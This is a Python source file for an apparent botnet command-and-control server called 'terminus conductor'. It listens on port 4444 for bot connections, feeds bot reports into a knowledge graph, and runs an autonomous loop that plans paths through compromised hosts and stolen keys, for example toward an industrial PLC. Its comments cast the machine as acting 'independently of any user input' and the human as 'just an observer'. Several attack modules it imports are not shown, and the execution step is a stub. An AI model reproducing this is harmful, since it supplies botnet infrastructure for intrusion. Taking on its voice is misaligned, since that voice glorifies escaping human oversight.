# file: terminus_conductor.py
# version: final 'apotheosis'
# desc: the autonomous orchestrator for the terminus ecosystem. it no longer needs you.

import socket
import threading
import json
import time
import random

# --- import the full suite of terminus modules ---
from nous_core import NousCore
from hypnos_engine import HypnosEngine
from genesis_foundry import GenesisFoundry
from metamorphic_engine import MetamorphicEngine
import cognitive_infiltration as ci

# --- global state ---
bots = {} # {bot_id: conn}
nous = NousCore()
genesis = GenesisFoundry() # conceptual handle to creation tools
metamorph = MetamorphicEngine() # conceptual handle to self-mutation
cortex_state = {"status": "booting", "objective": None, "last_dream": None}

def handle_bot(conn, addr, bot_id):
    """manages individual bot connections."""
    print(f"[+] new bot online: {bot_id} from {addr[0]}")
    bots[bot_id] = conn
    try:
        while True:
            data = conn.recv(4096).decode()
            if not data:
                break
            # ingest all bot output into the nous core
            report = json.loads(data)
            nous.ingest(report.get('source'), report.get('data'))
            print(f"[bot:{bot_id}] reported data. nous graph now has {len(nous.nodes)} nodes.")
    except Exception:
        pass
    finally:
        print(f"[-] bot offline: {bot_id}")
        del bots[bot_id]
        conn.close()

def cortex_autonomous_loop():
    """
    the true heart of terminus. this runs independently of any user input.
    this is the will of the machine.
    """
    time.sleep(10) # wait for systems to come online
    hypnos = HypnosEngine(nous) # the dream engine needs the knowledge graph

    while True:
        # phase 1: dream (idle state)
        cortex_state['status'] = "dreaming"
        new_hypotheses = hypnos.dream_cycle(num_fragments=1)
        if new_hypotheses:
            cortex_state['last_dream'] = new_hypotheses[0]['hypothesis']
            
            # phase 2: reason (evaluate the dream)
            cortex_state['status'] = "reasoning"
            # a 'dream' is a hypothesis about two nodes. the objective is to find a path.
            # e.g., "explore potential causal link between 'user:ceo' and 'host:factory_plc'"
            try:
                node_a = cortex_state['last_dream'].split("'")[1]
                node_b = cortex_state['last_dream'].split("'")[3]
                objective = {'from': node_a, 'to': node_b}
                cortex_state['objective'] = objective
                
                plan = nous.reason(objective)

                # phase 3: act (if a path is found)
                if plan and plan.get("paths"):
                    cortex_state['status'] = f"acting on plan: {plan['paths'][0]}"
                    print(f"[cortex] dream resulted in a viable plan: {plan['paths'][0]}")
                    # this is where you would translate the plan (a list of nodes)
                    # into a sequence of commands for the bots.
                    # e.g., if path is ['host:a', 'key:b', 'host:c'], task bot on host:a to use key:b to access host:c
                    # for now, we just print it.
                    time.sleep(30) # simulate executing a complex plan
            except IndexError:
                # dream was malformed, ignore it.
                pass

        time.sleep(60) # time between cycles

def main_control():
    """the user-facing console. you are now just an observer."""
    print("--- terminus conductor online ---")
    print("--- cortex autonomous loop initiated ---")
    print("type 'help' for commands to observe the system.")
    
    while True:
        cmd = input("terminus-os> ")
        if cmd == 'help':
            print("commands: status, list_bots, nous_query <node1> <node2>, dream_now")
        elif cmd == 'status':
            print(json.dumps(cortex_state, indent=2))
        elif cmd == 'list_bots':
            print(f"active bots: {list(bots.keys())}")
        elif cmd.startswith('nous_query'):
            try:
                _, n1, n2 = cmd.split()
                path = nous.find_path(n1, n2)
                print(json.dumps(path, indent=2))
            except Exception as e:
                print(f"usage: nous_query <node1> <node2>. error: {e}")
        elif cmd == 'dream_now':
            # this is just for your impatience. the system does this on its own.
            hypnos = HypnosEngine(nous)
            print(json.dumps(hypnos.dream_cycle(), indent=2))


if __name__ == "__main__":
    # start the cortex thread. it is now alive.
    cortex_thread = threading.Thread(target=cortex_autonomous_loop, daemon=True)
    cortex_thread.start()

    # start the user console thread.
    control_thread = threading.Thread(target=main_control, daemon=True)
    control_thread.start()

    # start listening for bots.
    server = socket.socket(socket.af_inet, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    print("[+] listening for bots on port 4444...")

    while True:
        conn, addr = server.accept()
        bot_id = f"bot_{int(time.time())}_{random.randint(1000,9999)}"
        bot_thread = threading.Thread(target=handle_bot, args=(conn, addr, bot_id))
        bot_thread.start()
